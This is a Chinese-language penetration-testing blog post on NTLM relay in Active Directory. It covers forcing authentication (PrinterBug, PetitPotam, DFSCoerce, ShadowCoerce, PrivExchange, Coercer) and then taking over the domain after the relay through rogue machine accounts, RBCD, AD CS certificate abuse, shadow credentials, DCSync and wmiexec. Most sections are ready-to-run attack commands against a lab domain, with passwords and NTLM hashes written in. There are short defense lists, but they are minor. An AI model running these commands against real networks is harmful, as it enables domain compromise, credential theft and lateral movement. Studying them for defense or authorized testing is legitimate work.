---
title: 域渗透 relay
subtitle:
date: 2024-08-15T09:31:01+08:00
slug: 58
draft:  false
author: 
  name: 东隅
  link:
  email: 735587142
  avatar: 
description:
keywords:
license:
comment: false
weight: 0
tags:
  - 攻防
  - 内网渗透
categories:
  - 攻防
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRss: false
hiddenFromRelated: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: true
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter

---

<!--more-->

> 在早期的 SMB 重放攻击中, 允许将 Client 请求的数据包重放至 Client 本身, 这就造成了 `MS08-068` 漏洞, 但漏洞在 2008 R2 中已经被修复.
>
> NTLM Relay 分为三个部分：监听器设置、触发NTLM认证和中继后攻击，其中关于触发 NTLM 认证的方式可以分为诱导的方式（系统命令、PDF文件等）、欺骗的方式（LLMNR/NBNS）和强制等方式，而本文第二部分着重探讨强制触发认证的方式，包括五种：PrinterBug、PeitiPotam、DFSCoerce、ShadowCoerce、PrivExchange，最后介绍一款集成工具Coercer



# NTLM Relay

NTLM Relay 基于 NTLM 协议，而 NTLM 认证信息作为”独立部分“会被嵌入到应用协议的数据包中，如SMB、HTTP、LDAP、MSSQL等。此外可以实现跨协议Relay，如通过某个协议（如HTTP）在另一个协议（如SMB）上转发LM或NTLM认证信息

NTLM Relay Attack（NTLM中继攻击）指的是强制目标服务器、目标用户使用LM Hash、NTLM Hash对攻击者的服务器进行认证，攻击者将该认证中继至其他目标服务器中（域控等），根据目标域的防护等级可以在活动目录域中进行横向移动或权限提升



# 强制触发认证的五种方式

## PrinterBug

> MS-RPRN
>
> RpcRemoteFindFirstPrinterChangeNotificationEx()

### 攻击原理

通过触发 SpoolService 错误，强制目标通过 MS-RPRN RPC 接口向攻击者进行身份验证。
MS-RPRN 协议中定义的 `RpcRemoteFindFirstPrinterChangeNotificationEx()` 方法允许域用户创建远程更改通知对象，该对象用于监视打印机对象的更改，并且在发生修改后会向打印客户端发送更改通知，这里的打印客户端指的就是攻击者的主机，用于接收目标发送的更改通知（NTLM 认证请求）

简而言之，就是通过触发打印机错误实现强制NTLM认证。

条件：

- 打印服务开启 - spoolsv.exe
- 拥有一个域用户凭据信息

### 攻击流程&相关工具

> 环境简介
> 域名 - hack.lab
> 域控 - DC01 - 20.20.20.5
> 辅域 - F2016 - 20.20.20.6
> 域主机 - USER01 - 20.20.20.10
> Kali - 20.20.20.100

工具地址 - [SpoolSample](https://github.com/leechristensen/SpoolSample)

1. 开启监听器 ntlmrelay.py
   选择添加用户参数 --add-computer
   由于要中继到 ldaps 服务上，添加消除 mic 验证参数 --remove-mic（具体原理见后续文章）

   ```shell
   python3 ntlmrelayx.py -t ldaps://dc01.hack.lab --add-computer JustTest$ --remove-mic
   ```

2. 使用 printerbug 漏洞利用工具
   printerbug.py 触发辅域控进行强制验证

   ```shell
   python3 printerbug.py hack.lab/spiderman:123.com@20.20.20.6 20.20.20.100
   ```

   PS：这里攻击辅域控是因为域控发起的验证不能中继回自身（相关细节见MS08-068），故这里对辅域控进行强制验证。

### 防御措施

- 非必要不启用 Print Spooler 服务
- 限制出入站的 NTLM 认证
- 打微软官方补丁



## PeitiPotam

> MS-EFSR
>
> \PIPE\lsarpc
>
> EfsRpcOpenFileRaw()

### 攻击原理

在微软加密文件系统远程协议（`Microsoft Encrypting File System Remote Protocol, MS-EFSRPC`）中，提供了 EfsRpcOpenFileRaw() 接口，该 API 用于维护和管理远程网络访问的加密对象。

==攻击者使用 MS-EFSRPC 协议连接到服务器，通过修改EfsRpcOpenFileRaw() 中的 FileName 参数劫持认证会话，迫使服务器进行强制验证。==

简而言之，劫持目标函数中的FileName参数触发强制认证。

条件：

- 目标支持 MS-EFSR 协议
- 拥有一个域用户凭据信息

### 攻击流程&相关工具

工具地址 - [PetitPotam](https://github.com/topotam/PetitPotam)

实验测试：

> 环境简介
> 域名 - hack.lab
> 域控 - DC01 - 20.20.20.5
> 辅域 - F2016 - 20.20.20.6
> 域主机 - USER01 - 20.20.20.10
> Kali - 20.20.20.100

1. 启动监听器 ntlmrelay.py
   这里和上面一样，也是通过添加用户来验证 PeitiPotam 强制验证成功与否。

   ```shell
   python3 ntlmrelayx.py -t ldaps://dc01.hack.lab --add-computer JustTest01$ --remove-mic
   ```

2. 利用工具触发认证
   使用 PeitiPotam 利用工具进行强制触发认证，也是以辅域控为目标

   ```shell
   python3 PetitPotam.py -d hack.lab -u spiderman -p 123.com 20.20.20.100 20.20.20.6
   python3 PetitPotam.py -u 'WIN19$' -hashes :2c05ad434d747b203a57565194891b38 -d xiaorang.lab -dc-ip 172.22.4.7 WIN19.xiaorang.lab DC01.xiaorang.lab
   ```

### 防御措施

- 删除不必要的角色服务
- 限制出入站的 NTLM 认证
- 打微软补丁



## DFSCoerce

> CVE-2022-26925
>
> MS-DFSNM
>
> \pipe\netdfs
>
> NetrDfsRemoveStdRoot() - NetrDfsAddStdRoot()

### 攻击原理

在微软分布式文件系统命名空间管理协议[MS-DFSNM](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979) 中，提供了一个管理DFS配置的RPC接口，该接口可通过 `\pipe\netdfs` SMB命名管道获得。

攻击者使用 MS-EFSRPC 协议中的RPC接口来触发强制认证，目前发现的特定方法有两个：NetrDfsRemoveStdRoot() 和 NetrDfsAddStdRoot()

条件

- 域内启用 MS-DFSNM 协议
- 拥有一个域用户凭据信息
- 只对域控有效

### 攻击流程&相关工具

工具地址 - [DFSCoerce](https://github.com/Wh04m1001/DFSCoerce)

实验环境：

> 环境简介
> 域名 - hack.lab
> 域控 - DC01 - 20.20.20.5
> 辅域 - F2016 - 20.20.20.6
> 域主机 - USER01 - 20.20.20.10
> Kali - 20.20.20.100

1. 开启监听器 ntlmrelay.py
   通过添加用户来验证 PeitiPotam 强制验证成功与否。

   ```shell
   python3 ntlmrelayx.py -t ldaps://dc01.hack.lab --add-computer JustTest02$ --remove-mic
   Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC$
   ```
   
2. 使用 DFSCoerce 漏洞利用工具，触发辅域控进行强制验证

   ```shell
   python3 dfscoerce.py -u spiderman -p 123.com -d hack.lab 20.20.20.100 20.20.20.6
   python3 dfscoerce.py -u spiderman -hashes "xxx" -d hack.lab   监听ip   DC
   ```



### 防御措施

- 禁用已废弃的NTLM认证
- 启用身份验证扩展保护 (EPA)、SMB 签名
- 关闭 AD CS 服务器上的 HTTP 保护
- 打微软补丁 CVE-2022-26925



## ShadowCoerce

> CVE-2022-30154
> MS-FSRVP
> \pipe\FssagentRpc
> IsPathSupported() - IsPathShadowCopied()

### 攻击原理

MS-FSRVP 是微软的文件服务器远程VSS协议。用于在远程计算机上创建文件共享卷影副本，该协议提供的接口可通过 `\pipe\FssagentRpc` SMB命名管道获得。
攻击者通过使用一种依赖于远程UNC路径的特定方法来实现强制验证 —— IsPathSupported() 和 IsPathShadowCopied()

条件

- 目标服务器安装了文件服务器VSS代理服务
- 开启MS-FSRVP协议
- 拥有一个域用户凭据信息



实验环境配置

实验环境：

> 环境简介
> 域名 - hack.lab
> 域控 - DC01 - 20.20.20.5
> 辅域 - F2016 - 20.20.20.6
> 域主机 - USER01 - 20.20.20.10
> Kali - 20.20.20.100

除此之外，需要在目标服务器上启用 文件服务器VSS代理服务



### 攻击流程&相关工具

工具地址 - [ShadowCoerce](https://github.com/ShutdownRepo/ShadowCoerce)

1. 开启监听器 ntlmrelayx ，这里也同样使用添加机器账户用于确认强制验证成功与否

   ```shell
   python3 ntlmrelayx.py -t ldaps://dc01.hack.lab --add-computer JustTest03$ --remove-mic
   ```

2. 使用 shadowcoerce 脚本利用工具，触发强制验证

   ```shell
   python3 shadowcoerce.py -u spiderman -p 123.com -d hack.lab 20.20.20.100 20.20.20.6
   ```



### 防御措施

- 限制出入站的 NTLM 认证
- 使用认证的扩展保护（EPA）
- 打补丁 CVE-2022-30154



## PrivExchange

### 攻击原理

在Exchange中，提供了网络服务API - PushSubscription，允许订阅推送通知。Exchange服务器在域中通常有很高的权限（WriteDacl，修改目标ACL的权限），是攻击的不戳目标。

攻击者可以利用该API迫使Exchange服务器对指定目标进行强制认证。

条件：

- 目标为Exchange，且未打补丁
- 拥有一个带有邮箱的域用户凭据信息



### 攻击流程&相关工具

工具地址 - [PrivExchange](https://github.com/dirkjanm/privexchange/)

实验测试：

> 环境简介
> 域名 - hack.lab
> 域控 - DC01 - 20.20.20.5
> Exchange服务器 - E2016 - 20.20.20.7
> 域主机 - USER01 - 20.20.20.10
> Kali - 20.20.20.100

```shell
python3 ntlmrelayx.py -t ldaps://dc01.hack.lab --escalate-user spiderman

python3 privexchange.py -u spiderman -p 123.com -d hack.lab -ah 20.20.20.100 20.20.20.7
```



### 防御措施

- 删除Exchange上的高权限用户
- 启用 LDAP 签名，开启 LDAP 通道绑定
- 打微软补丁

## 集成工具推荐 - Coercer

Coercer 是一款集成多种方法对目标服务器进行强制验证的python脚本

工具地址 - [Coercer](https://github.com/p0dalirius/Coercer)

### 工具安装

```shell
git clone https://github.com/p0dalirius/Coercer
python3 -m pip install coercer
```

### 工具使用

分析目标服务器可利用的接口，使用 --analyze 参数

```shell
python3 Coercer.py -u spiderman -p 123.com -d hack.lab -l 20.20.20.100 -t 20.20.20.6 --analyze
```

PS：加 -v 可以显示更加详细的信息

执行强制验证攻击，默认先使用了 MS-EFSR::EfsRpcOpenFileRaw 方法

```shell
python3 Coercer.py -u spiderman -p 123.com -d hack.lab -l 20.20.20.100 -t 20.20.20.6
```

## 总结

本文介绍了5种强制验证的思路，下面将其进行对比汇总成一个表格

| Coerce       | SMB named pipe    | Protocol | API / Methods                                                |
| :----------- | :---------------- | :------- | :----------------------------------------------------------- |
| PrinterBug   | \PIPE\spoolss     | MS-RPRN  | RpcRemoteFindFirstPrinterChangeNotificationEx                |
| PeitiPotam   | \PIPE\lsarpc      | MS-EFSR  | EfsRpcOpenFileRaw EfsRpcEncryptFileSrv EfsRpcDecryptFileSrv EfsRpcQueryUsersOnFile EfsRpcQueryRecoveryAgents EfsRpcFileKeyInfo |
| DFSCoerce    | \pipe\netdfs      | MS-DFSNM | NetrDfsRemoveStdRoot NetrDfsAddStdRoot                       |
| ShadowCoerce | \pipe\FssagentRpc | MS-FSRVP | IsPathSupported IsPathSupported                              |
| PrivExchange |                   |          | PushSubscription                                             |



# 中继后攻击

> 攻击的思路可以从域内目标资源对象来展开，分为
>
> 针对 ADCS 的攻击
>
> 针对 域内主机资源的 RBCD 攻击
>
> 针对 当前计算机的攻击
>
> 针对 影子账户的攻击

![image-20240605230213662](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406052302829.webp)

## 添加机器账户

> --add-computer

### 攻击条件

- 强制认证的目标需要有高权限，可以创建用户
- 目标的 ms-DS-MachineAccountQuota 属性不为0
- 目标具有 SeMachineAccountPrivilege 特权

### 攻击流程

1. 启动监听器
   利用 ntlmrelay 工具中的参数 --add-computer

   ```shell
   python3 ntlmrelayx.py -t ldaps://dc01.hack.lab --add-computer JustTest$ --remove-mic
   ```

   修改数据包中的值，需要切换协议，因此需要绕过mic验证，使用到参数 --remove-mic
   JustTest$ 为新增的机器账户名

2. 触发认证
   可以通过诱导、欺骗和强制验证等手段触发目标NTLM验证，这里使用 PetitPotam 进行强制认证

   ```shell
   python3 PetitPotam.py -d hack.lab -u spiderman -p 123.com 20.20.20.100 20.20.20.6
   ```



查看 mS-DS-CreatorSID 属性，再通过 SID 反查可以看到是辅域控机器账户添加的（20.20.20.6）

```shell
AdFind.exe -h 20.20.20.5 -u spiderman -up 123.com -b "DC=hack,DC=lab" -f "objectClass=computer" mS-DS-CreatorSID
```

$objSID = New-Object System.Security.Principal.SecurityIdentifier S-1-5-21-3309395417-4108617856-2168433834-2102;$objUser = $objSID.Translate([System.Security.Principal.NTAccount]);$objUser.Value

![image-20240605225845913](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406052258662.webp)



## 修改目标服务器 RBCD 属性

> --delegate-access
>
> --escalate-user

### 攻击原理

强制 NTLM 验证后对目标服务器 RBCD 属性进行修改，指向一个新的机器账户（或已存在的）。之后的流程就和 RBCD 攻击一致，利用该机器账户进行后渗透（DCSync）

条件：
- 域控支持 LDAPS 协议
- 能创建机器账户或已有可控的机器账户

### 攻击流程

> 环境简介
> 域名 - hack.lab
> 域控 - DC01 - 20.20.20.5
> 辅域 - F2016 - 20.20.20.6
> 域主机 - USER01 - 20.20.20.10
> Kali - 20.20.20.100

创建机器账户

[bloodyAD](https://github.com/CravateRouge/bloodyAD)

```shell
python3 bloodyAD.py -d hack.lab -u spiderman -p '123.com' --host 20.20.20.5 addComputer CPT001 '123.com'
```

[addcomputer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py)

```shell
python3 addcomputer.py hack.lab/spiderman:123.com -method LDAPS -computer-name CPT001\$ -computer-pass 123.com -dc-ip DC01.hack.lab
```



1.开启监听

使用 ntlmrelay 进行监听 

```
python3 ntlmrelayx.py -t ldap://DC01.hack.lab -smb2support --remove-mic --delegate-access --escalate-user CPT001$
由于需要跨协议中继，需要绕过 mic 验证 ，结合 CVE-2019-1040 漏洞执行  
如果不使用 --remove-mic 参数，会出现以下报错：
```

2.使用PetitPotam触发目标 NTLM 验证

```
python3 PetitPotam.py -d hack.lab -u spiderman -p 123.com 20.20.20.100 20.20.20.10
```

此外，ntlmrelay工具集成了前两步的功能，直接创建机器账户并修改中继修改目标的 RBCD 属性

```shell
python3 ntlmrelayx.py -t ldaps://DC01.hack.lab -smb2support --delegate-access --remove-mic
```

验证及使用

可以在域控上查看目标服务器（20.20.20.10）的RBCD属性

```
Get-ADComputer USER01 -Properties PrincipalsAllowedToDelegateToAccount
```

后续的使用就是通过 getST.py 脚本申请服务票据和使用

```
python3 getST.py -spn cifs/USER01.hack.lab -impersonate administrator hack.lab/CPT001\$:123.com -dc-ip 20.20.20.5
```





## 转储AD CS注册服务和证书模板信息

> --dump-adcs

### 攻击原理

通过 LDAP 获得域的 ADCS 配置（注册服务和证书模板，以及它们的访问权限），以便能够在没有域账户的情况下知道 ADCS 中继的目标服务器和模板。

网络证书注册服务在其默认配置中容易受到 NTLM Relay 的影响，允许攻击者请求认证他们中继的用户或机器的证书并接管他们的账户

### 攻击流程

1.找到网络注册服务的地址
检查DCs上是否安装了 AD CS 网络注册服务 

```
curl xx.xx.xx.xx/certsrv/ -I
```

检查由域的TLS服务提供的TLS证书中的信息

查看本地机器账户的证书

```powershell
Get-ChildItem Cert:\LocalMachine\Root\
```

确定了AD CS的ip为 20.20.20.6



2.设置监听器
使用 ntlmrelay 作为中继监听器
参数 --dump-adcs 用于转储AD CS注册服务和证书模板信息

```shell
python3 ntlmrelayx.py -debug -t ldap://20.20.20.5 --dump-adcs --remove-mic
```



3.强制NTLM认证

```shell
python3 PetitPotam.py -u spiderman -p 123.com -d hack.lab 20.20.20.100 20.20.20.6
```



4.获得域内信息

在 F2016.hack.lab 主机上存在一个注册服务，任何经过认证的用户都可以在上面申请证书。可以获取到允许使用模板的用户有哪些

```
certipy cert -pfx xx.pfx -nokey -out xxx.crt
certipy cert -pfx xx.pfx -nocert -out xxx.crt
```

其次还通过LDAP对域内进行信息收集，并在本地保存了关键信息



## 获取AD CS证书

### 攻击原理

在域内配置了AD CS的情况下，可以通过NTLM Relay攻击获取到的证书进行申请 TGT 操作。

> 关于证书攻击的部分可以查看之前的一些文章

前置条件：

1. AD CS被配置为允许NTLM认证
2. NTLM认证没有受到EPA或SMB签名的保护
3. AD CS正在运行这些服务中的任何一个：
   - 证书颁发机构web注册
   - 证书注册web服务

### 攻击流程

1. 使用 PetitPotam 针对域控强制验证
2. 监听获取域控的认证信息，伪造域控身份
3. 中继域控认证至AD CS上
4. AD CS 返回域控对应的证书
5. 使用该证书向域控申请 TGT



#### 攻击目标支持 PKINIT 协议

在下面的实验中，攻击目标为域控 DC01$。如果域控支持 PKINIT 协议，在获取到域控的证书后，可以基于 PKINIT 协议申请 TGT。

1. 设置监听器
   使用ntlmrelay工具进行监听

   ```shell
   python3 ntlmrelayx.py -debug -smb2support --target http://20.20.20.6/certsrv/certfnsh.asp --adcs --template DomainController
   ```

2. 强制认证
   简单演示，使用 PetitPotam 工具进行强制认证

   ```shell
   python3 PetitPotam.py -u spiderman -p 123.com -d hack.lab 20.20.20.100 20.20.20.5
   ```

3. 证书处理
   执行上述两条命令后，可以看到获取到一串 Base64 证书信息，将其保存至 DC01_base64.txt 文件中

   将其解密为 .pfx 文件

   ```shell
   cat DC01_base64.txt | base64 -d > dc01.pfx
   ```

通过gettgtpkinit.py使用证书申请TGT

```shell
python3 gettgtpkinit.py -cert-pfx dc01.pfx hack.lab/DC01$ dc01.ccache

2022-10-04 12:15:43,821 minikerberos INFO     b12ef2da16bdd741749a2ec30e67f0507ba38d7bb72f1c11034bc7160be98e50
INFO:minikerberos:b12ef2da16bdd741749a2ec30e67f0507ba38d7bb72f1c11034bc7160be98e50
2022-10-04 12:15:43,823 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```



获取到域控TGT的后渗透攻击思路

思路1 - 获取域控Hash

```
KRB5CCNAME=dc01.ccache python3 getnthash.py -key b12ef2da16bdd741749a2ec30e67f0507ba38d7bb72f1c11034bc7160be98e50 hack.lab/DC01$
```

思路2 - 执行DCSync攻击并横向

```
KRB5CCNAME=dc01.ccache python3 secretsdump.py -k hack.lab/DC01\$@DC01.hack.lab -no-pass -just-dc-user administrator

python3 wmiexec.py -hashes :42e2656ec24331269f82160ff5962387 hack.lab/administrator@DC01.hack.lab -dc-ip 20.20.20.5
```

> PS：如果出现如下报错信息
> [-] ERROR_DS_NAME_ERROR_NOT_UNIQUE: Name translation: Input name mapped to more than one output name.
> 就使用 -just-dc-user administrator 参数指定对象



#### 攻击目标不支持 PKINIT 协议

这种情况下申请 TGT 票据会出现以下错误：

```shell
KDC_ERR_PADATA_TYPE_NOSUPP Detail: "KDC has no support for PADATA type (pre-authentication data)" 
```

因此只能曲线就过了 —— 需要结合PTC攻击新思路，使用 PassTheCert 工具对LDAP服务器进行认证并进一步执行其他攻击思路。

工具地址 - [PassTheCert](https://github.com/AlmondOffSec/PassTheCert)

域内环境：

```txt
域控 - 20.20.20.5
辅域控（AD CS） - 20.20.20.6
域内主机 - 20.20.20.10
Kali - 20.20.20.100
```

1. 使用 Certipy 工具获取 pfx 文件中的密钥和证书信息

   ```shell
   certipy cert -pfx NoPKI02.pfx -nokey -out NoPKI02.crt
   certipy cert -pfx NoPKI02.pfx -nocert -out NoPKI02.key 
   ```

   ![x3TcZt.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-0484943bc742b4af5f7e3957b8b241aa173861c4.png)

2. 使用 passthecert.py 创建机器账户

   ```shell
   python3 passthecert.py -action add_computer -crt NoPKI02.crt -key NoPKI02.key -domain hack.lab -dc-ip 20.20.20.5 -computer-name NoPKI02$ -computer-pass 123.com
   ```

![x3T2If.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-e6390bd0f9d8f3370c339c4eb0e7a11ef4254137.png)

1. 使用 passthecert.py 添加 RBCD 属性

   ```shell
   python3 passthecert.py -action write_rbcd -crt NoPKI02.crt -key NoPKI02.key -domain hack.lab -dc-ip 20.20.20.5 -delegate-from NoPKI02$ -delegate-to DC01$
   ```

   ![x3TWi8.png](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-00e8c6a447520a80912521c26d918a280d735af5.png)

2. 后渗透：申请TGT及攻击

   ```
   python3 getST.py -spn cifs/DC01.hack.lab -impersonate administrator hack.lab/NoPKI02\$:123.com -dc-ip 20.20.20.5
   KRB5CCNAME=administrator.ccache python3 wmiexec.py -k hack.lab/administrator@DC01.hack.lab -no-pass -dc-ip 20.20.20.5
   ```

   



## 修改 Shadow Credentials 属性 | 影子账户

> --shadow-credentials

### 攻击原理

在支持 PKINIT 协议的域内环境，若目标机器账户存在 msDS-KeyCredentialLink 属性（公钥信息），在预认证中，可以使用对应的证书（私钥信息）进行验证身份。

通过 NTLM Relay 攻击强制修改目标服务器的 msDS-KeyCredentialLink 属性，使用私钥信息申请 TGT，实现对目标对象持久和隐蔽的访问

具体的原理在[之前的文章](https://forum.butian.net/share/1607)中有详细介绍过

条件：
- 目标服务器支持 PKINIT 协议
- 域控制器版本在Windows Server 2016以上
- 域内安装了AD CS服务

### 攻击流程

1.开启监听器

使用[ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py)工具开启监听， --remove-mic 参数用于跨协议时LDAP签名的消除

```shell
python3 ntlmrelayx.py -t ldap://DC01.hack.lab --remove-mic --shadow-credentials --shadow-target F2016$
```



2.执行强制认证

使用PetitPotam.py进行强制认证 

```
python3 PetitPotam.py -u spiderman -p 123.com -d hack.lab 20.20.20.100 20.20.20.6
```

生成了对应的证书，由于需要结合AD CS使用，也分为两种情况：

支持 PKINIT 协议和不支持 PKINIT 协议

详情可以参考上一部分



## 利用 Exchange 创建机器账户

> CVE-2021-34470
> 绕过创建机器账户的限制

### 攻击原理

在域中对普通用户限制创建机器账户的情况下，利用 Exchange 安装中一个有漏洞的LDAP模式对象，执行添加机器账户操作。

背景：
由于域内用户权限不正确及配置的不当，导致用户创建机器账户进行域内渗透攻击。
因此，在常见的域内加固过程中，对域用户创建机器账户进行限制主要可以通过以下两种方法：

1. 修改域对象的LDAP属性ms-DS-MachineAccountQuota，默认为10，设置为0即可
2. 域特权SeMachineAccountPrivilege，管理哪些用户可以向域添加机器账户，默认设置为Authenticated Users，即全部用户。可以将其修改为小范围高权限用户，如Domain Admins

该漏洞在2021年7月由James Forshaw公布，编号为CVE-2021-34470，一个计算机账户可以在自己下面创建一个msExchStorageGroup对象，然后在这个对象下可以创建许多类型的额外对象，包括机器账户。

简而言之，利用 Exchange 中存在缺陷的对象创建机器账户

相关攻击方式已经集成至 ntlmrelay 中的 --add-computer 参数中，详情见该[pull](https://github.com/SecureAuthCorp/impacket/pull/1288)
工具使用可以查看 --add-computer 部分











